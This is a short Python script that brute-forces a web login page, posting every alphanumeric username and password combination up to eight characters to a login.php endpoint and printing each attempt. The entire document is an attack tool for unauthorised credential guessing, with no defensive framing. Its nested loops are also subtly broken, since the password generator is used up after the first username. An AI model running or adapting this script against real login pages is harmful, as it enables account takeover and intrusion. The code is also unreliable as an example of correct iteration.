import requests
import itertools
import string
import time

url = 'https://blueserver/login.php'
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
max_length = 8


usernames = itertools.chain(
    *[itertools.product(characters, repeat=i) for i in range(1, max_length + 1)]
)
passwords = itertools.chain(
    *[itertools.product(characters, repeat=i) for i in range(1, max_length + 1)]
)

for username_tuple in usernames:
    username = ''.join(username_tuple)
    for password_tuple in passwords:
        password = ''.join(password_tuple)

        credentials = {
            'user': username,
            'pass': password
        }

        response = requests.post(url, data=credentials)

        print(f'Attempted {username}:{password}', response)

        time.sleep(1)

